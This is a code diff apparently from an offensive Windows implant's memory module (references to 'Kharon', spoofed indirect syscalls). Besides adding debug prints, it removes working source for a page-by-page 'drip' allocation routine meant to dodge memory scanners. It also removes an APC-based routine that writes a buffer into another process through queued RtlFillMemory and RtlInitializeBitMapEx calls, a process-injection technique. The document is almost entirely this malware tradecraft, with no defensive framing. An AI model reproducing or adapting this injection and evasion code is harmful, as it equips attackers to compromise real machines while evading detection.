@@ -55,6 +55,9 @@ auto DECLFN Memory::Alloc(
     UPTR ssn = SYS_SSN( Sys::Alloc );
 
     KhDbg("executing indirect syscall with spoof");
+    KhDbg("address: %p", Address);
+    KhDbg("ssn: %x", ssn);
+
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)&BaseAddress,
         0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
@@ -63,43 +66,6 @@ auto DECLFN Memory::Alloc(
     Self->Usf->NtStatusToError( Status );
     
     return NT_SUCCESS( Status ) ? BaseAddress : nullptr;
-}
-
-auto DECLFN Memory::DripAlloc(
-    _In_  SIZE_T  Size,
-    _In_  ULONG   Protect,
-    _In_  HANDLE  Handle
-) -> PVOID {
-    if ( Size < this->PageGran ) 
-        return Self->Mm->Alloc( nullptr, Size, MEM_COMMIT, Protect, Handle );
-
-    ULONG GranCount = ( PAGE_ALIGN( Size ) / this->PageGran ) + 1;
-    ULONG PageCount = ( this->PageGran / this->PageSize );
-
-    PVOID  BaseAddress = Self->Usf->ValidGranMem( Handle, GranCount );
-    PVOID  CurrentBase = BaseAddress;
-    PVOID* AddressList = (PVOID*)hAlloc( GranCount );
-
-    for ( INT i = 0; i < GranCount; i++ ) {
-        CurrentBase = Self->Mm->Alloc( 
-            CurrentBase, PageGran, MEM_RESERVE, PAGE_NOACCESS, Handle
-        );
-
-        AddressList[i] = CurrentBase;
-        CurrentBase    = (PVOID)( (UPTR)CurrentBase + PageGran );
-    }  
-
-    for ( INT x = 0; x < GranCount; x++ ) {
-        for ( INT z = 0; z < PageCount; z++ ) {
-            CurrentBase = (PVOID)( (UPTR)( AddressList[x] ) + ( z * PageSize ) );
-
-            CurrentBase = Self->Mm->Alloc( 
-                CurrentBase, PageSize, MEM_COMMIT, Protect, Handle 
-            );
-        }
-    }
-
-    return BaseAddress;
 }
 
 auto DECLFN Memory::Protect(
@@ -131,91 +97,6 @@ auto DECLFN Memory::Protect(
     Self->Usf->NtStatusToError( Status );
 
     return NT_SUCCESS( Status );
-}
-
-auto DECLFN Memory::WriteAPC(
-    _In_ HANDLE Handle,
-    _In_ PVOID  Base,
-    _In_ BYTE*  Buffer,
-    _In_ ULONG  Size
-) -> BOOL {
-    G_KHARON
-
-    HANDLE   ThreadHandle = NULL;
-    PVOID    WritePtr     = nullptr;
-    NTSTATUS NtStatus     = STATUS_SUCCESS;
-    INT32    AlignCheck   = ( Size % 16 );
-    INT32    OffsetMax    = ( Size - AlignCheck );
-    INT32    OneCounter   = 0;
-    INT32    TwoCounter   = 0;
-    INT32    ThreeCounter = 0;
-    INT32    Mod          = 0;
-
-    ULONG ThreadId = 0;
-    PVOID Dummy    = (PVOID)1;
-
-    ThreadHandle = Self->Td->Create(
-        Handle, (PVOID)Self->Ntdll.RtlExitUserThread,
-        0, CREATE_SUSPENDED, 0, nullptr
-    );
-
-    PVOID mRtlInitializeBitMapEx = (PVOID)Self->Krnl32.GetProcAddress( Self->Krnl32.GetModuleHandleA("ntdll.dll"), "RtlInitializeBitMapEx" );
-    PVOID mRtlFillMemory         = (PVOID)Self->Krnl32.GetProcAddress( Self->Krnl32.GetModuleHandleA("ntdll.dll"), "RtlFillMemory" );
-
-    if ( Size >= 16 ) {
-        for ( OneCounter = 0; OneCounter < OffsetMax - 1; OneCounter = OneCounter + 16 ) {
-            WritePtr = ( (PBYTE)Base + OneCounter );
-
-            NtStatus = Self->Td->QueueAPC(
-                ThreadHandle,
-                mRtlInitializeBitMapEx,
-                WritePtr,
-                (PVOID)*(UPTR*)( Buffer + OneCounter + 8 ),
-                (PVOID)*(UPTR*)( Buffer + OneCounter )
-            );
-        }
-    }
-
-    if ( Size >= 8 ) {
-        for ( TwoCounter = OneCounter; (TwoCounter + 8) <= (OneCounter + AlignCheck); TwoCounter += 8 ) {
-            WritePtr = ( (PBYTE)Base + TwoCounter );
-
-            NtStatus = Self->Td->QueueAPC(
-                ThreadHandle,
-                mRtlFillMemory,
-                WritePtr,
-                (PVOID)8,
-                (PVOID)*(UPTR*)(Buffer + TwoCounter)
-            );
-        }
-
-        AlignCheck -= 8;
-    }
-
-    if ( AlignCheck > 0 && AlignCheck < 8 ) {
-
-        if (OneCounter != 0 && TwoCounter != 0)
-            ThreeCounter = Mod = TwoCounter;
-        else if (OneCounter != 0 && TwoCounter == 0)
-            ThreeCounter = Mod = OneCounter;
-
-        for ( ; ThreeCounter < (Mod + AlignCheck); ThreeCounter++ ) {
-            WritePtr = ( (PBYTE)Base + ThreeCounter );
-
-            NtStatus = Self->Td->QueueAPC(
-                ThreadHandle,
-                mRtlFillMemory,
-                WritePtr,
-                (PVOID)1,
-                (PVOID)Buffer[ThreeCounter]
-            );
-        }
-    }
-
-    Self->Krnl32.ResumeThread( ThreadHandle );
-    Self->Krnl32.WaitForSingleObject( ThreadHandle, INFINITE );
-    Self->Ntdll.NtClose( ThreadHandle );
-    return TRUE;
 }
 
 auto DECLFN Memory::Write(
